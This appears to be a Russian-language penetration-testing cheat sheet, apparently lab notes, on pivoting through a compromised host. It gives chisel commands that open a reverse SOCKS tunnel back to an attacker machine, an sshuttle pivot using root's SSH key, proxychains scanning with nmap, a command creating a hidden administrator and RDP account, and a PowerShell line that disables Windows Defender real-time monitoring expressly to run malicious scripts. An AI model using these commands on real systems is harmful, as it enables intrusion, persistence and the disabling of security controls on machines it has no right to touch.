https://github.com/jpillora/chisel?tab=readme-ov-file

Качаем на атакуемую и атакующую машину chisel

Запускаем сервер chisel на атакующей машине
```
chisel server -p listen_port --reverse
```
Запускаем клиент chisel на атакуемой машине
```
chisel client attaker_ip:attacker_port R:socks &
```
или наоборот, запускаем сервер на атакуемой машине:
```
chisel server -p 8888 --socks5
```
Запускаем клиент на атакующей машине:
```
chisel client 10.149.20.20:8888 socks
```
Команда разрешающая прямое TCP соединение, выплняется на windows:
```
netsh advfirewall firewall add rule name="osia" dir=in action=allow protocol=tcp localport=15666 - команда разрешающая прямое TCP соединение, выплняется на windows
```
Для тунелей прописываем в /etc/proxuchains4.conf в конце строчку:
```
socks5 127.0.0.1  attacker_port
```
Далее, запуская команды на атакующей машине, в начале нужно прописать proxychains:
```
sudo proxychains -q nmap -sT -sV -p- 20.34.45.6
```
Флаг -q убирает вывод самого proxychains
____________________________________________________________________
Используя только chisel столкнулся с проблемой что одного тоннеля мало, лучше использовать как основу **sshuttle**
```
sshuttle -r root@admin.holo.live --ssh-cmd "ssh -i /root/.ssh/id_rsa" 10.200.107.0/24 -x 10.200.107.33)
```
____________________________________________________________________
Как это работает:

Chisel сервером на машине атакующего начинает прослушивать порт, а на атакуемой машине клиент подключается к этому порту. Соединение на этот порт перенаправляется на локальный порт 1080 на машине атакующего, именно этот порт, потому что это настройки chisel по умолчанию

имея достаточно прав, можно создать пользователя и добавить его в нужные группы для управления по RDP
```
net user /add kalich password
net localgroup administrators kalich /add
net localgroup remotedesktopusers kalich /add
```
Отключаем динамический мониторинг команд Windows Defender для выполнения зловредных команд и скриптов
```
powershell.exe "Set-MpPreference -DisableRealtimeMonitoring 1"**
```
